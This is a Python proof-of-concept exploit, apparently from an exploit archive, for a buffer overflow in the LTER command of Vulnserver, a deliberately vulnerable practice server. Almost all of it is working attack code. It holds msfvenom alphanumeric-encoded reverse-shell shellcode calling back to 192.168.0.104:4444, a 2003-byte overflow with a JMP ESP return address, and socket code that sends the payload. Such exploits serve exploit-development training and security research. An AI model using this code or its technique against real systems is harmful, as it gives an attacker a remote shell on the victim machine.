# Exploit Title: Vuln Server  - Remote Buffer Overflow LTER command
# Date: 1-5-2019
# Exploit Author: buffered4ever
# Vendor Homepage: http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
# Software Link: http://sites.google.com/site/lupingreycorner/vulnserver.zip
# Version: NA
# Tested on: Windows XP SP2

#!/usr/bin/python

import socket
import os
import sys

host="192.168.0.102"
port=9999
#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -e x86/alpha_mixed BufferRegister=ESP -f python
buf =  ""
buf += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x39\x6c\x4b\x58\x4e\x62\x77\x70\x55\x50\x45\x50\x33"
buf += "\x50\x4b\x39\x4a\x45\x70\x31\x79\x50\x42\x44\x4c\x4b"
buf += "\x50\x50\x50\x30\x6e\x6b\x61\x42\x56\x6c\x6c\x4b\x52"
buf += "\x72\x45\x44\x4c\x4b\x52\x52\x37\x58\x44\x4f\x68\x37"
buf += "\x70\x4a\x44\x66\x64\x71\x6b\x4f\x6c\x6c\x67\x4c\x51"
buf += "\x71\x43\x4c\x76\x62\x36\x4c\x71\x30\x4b\x71\x6a\x6f"
buf += "\x54\x4d\x65\x51\x78\x47\x7a\x42\x49\x62\x63\x62\x76"
buf += "\x37\x4e\x6b\x61\x42\x34\x50\x4c\x4b\x73\x7a\x45\x6c"
buf += "\x6c\x4b\x70\x4c\x44\x51\x50\x78\x48\x63\x42\x68\x57"
buf += "\x71\x58\x51\x62\x71\x4c\x4b\x53\x69\x61\x30\x33\x31"
buf += "\x59\x43\x6e\x6b\x61\x59\x47\x68\x49\x73\x66\x5a\x70"
buf += "\x49\x6e\x6b\x77\x44\x6c\x4b\x76\x61\x39\x46\x56\x51"
buf += "\x39\x6f\x6e\x4c\x7a\x61\x7a\x6f\x66\x6d\x66\x61\x39"
buf += "\x57\x66\x58\x6d\x30\x31\x65\x39\x66\x64\x43\x73\x4d"
buf += "\x4a\x58\x35\x6b\x43\x4d\x55\x74\x51\x65\x58\x64\x50"
buf += "\x58\x6e\x6b\x56\x38\x65\x74\x45\x51\x4b\x63\x31\x76"
buf += "\x6e\x6b\x56\x6c\x32\x6b\x6e\x6b\x42\x78\x37\x6c\x37"
buf += "\x71\x59\x43\x4c\x4b\x55\x54\x4c\x4b\x43\x31\x5a\x70"
buf += "\x4c\x49\x47\x34\x71\x34\x64\x64\x63\x6b\x43\x6b\x73"
buf += "\x51\x53\x69\x30\x5a\x70\x51\x4b\x4f\x6b\x50\x51\x4f"
buf += "\x61\x4f\x32\x7a\x4c\x4b\x64\x52\x6a\x4b\x6e\x6d\x61"
buf += "\x4d\x70\x68\x70\x33\x76\x52\x47\x70\x57\x70\x52\x48"
buf += "\x71\x67\x42\x53\x54\x72\x61\x4f\x53\x64\x43\x58\x70"
buf += "\x4c\x34\x37\x54\x66\x46\x67\x39\x6f\x39\x45\x6c\x78"
buf += "\x6c\x50\x43\x31\x33\x30\x67\x70\x65\x79\x59\x54\x71"
buf += "\x44\x36\x30\x71\x78\x75\x79\x6b\x30\x50\x6b\x43\x30"
buf += "\x59\x6f\x79\x45\x72\x70\x52\x70\x62\x70\x72\x70\x77"
buf += "\x30\x36\x30\x77\x30\x32\x70\x65\x38\x7a\x4a\x36\x6f"
buf += "\x49\x4f\x6d\x30\x4b\x4f\x79\x45\x6c\x57\x52\x4a\x76"
buf += "\x65\x71\x78\x39\x50\x6f\x58\x55\x50\x75\x38\x51\x78"
buf += "\x33\x32\x55\x50\x54\x51\x43\x6c\x4d\x59\x78\x66\x30"
buf += "\x6a\x64\x50\x70\x56\x51\x47\x33\x58\x5a\x39\x49\x35"
buf += "\x72\x54\x35\x31\x39\x6f\x4e\x35\x4b\x35\x6b\x70\x52"
buf += "\x54\x36\x6c\x6b\x4f\x50\x4e\x53\x38\x62\x55\x58\x6c"
buf += "\x75\x38\x7a\x50\x6f\x45\x69\x32\x36\x36\x49\x6f\x48"
buf += "\x55\x73\x58\x75\x33\x52\x4d\x42\x44\x37\x70\x4f\x79"
buf += "\x49\x73\x56\x37\x72\x77\x46\x37\x66\x51\x69\x66\x52"
buf += "\x4a\x32\x32\x46\x39\x36\x36\x79\x72\x79\x6d\x65\x36"
buf += "\x6f\x37\x50\x44\x57\x54\x45\x6c\x43\x31\x75\x51\x4e"
buf += "\x6d\x30\x44\x75\x74\x46\x70\x78\x46\x55\x50\x67\x34"
buf += "\x63\x64\x36\x30\x46\x36\x30\x56\x46\x36\x67\x36\x71"
buf += "\x46\x72\x6e\x32\x76\x71\x46\x50\x53\x61\x46\x35\x38"
buf += "\x64\x39\x7a\x6c\x57\x4f\x4c\x46\x69\x6f\x38\x55\x6e"
buf += "\x69\x4b\x50\x50\x4e\x66\x36\x67\x36\x6b\x4f\x36\x50"
buf += "\x30\x68\x47\x78\x6e\x67\x35\x4d\x65\x30\x4b\x4f\x4a"
buf += "\x75\x6f\x4b\x48\x70\x6c\x75\x69\x32\x53\x66\x53\x58"
buf += "\x4f\x56\x4a\x35\x6f\x4d\x6f\x6d\x6b\x4f\x69\x45\x47"
buf += "\x4c\x43\x36\x53\x4c\x57\x7a\x4d\x50\x39\x6b\x49\x70"
buf += "\x50\x75\x65\x55\x6d\x6b\x73\x77\x47\x63\x43\x42\x42"
buf += "\x4f\x70\x6a\x77\x70\x73\x63\x49\x6f\x4b\x65\x41\x41"

#0x62501203 JMP ESP
buffer = "LTER /.:/" + "A" * 2003 + "\x03\x12\x50\x62" + buf

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send(buffer)
expl.recv(1024)
expl.close()
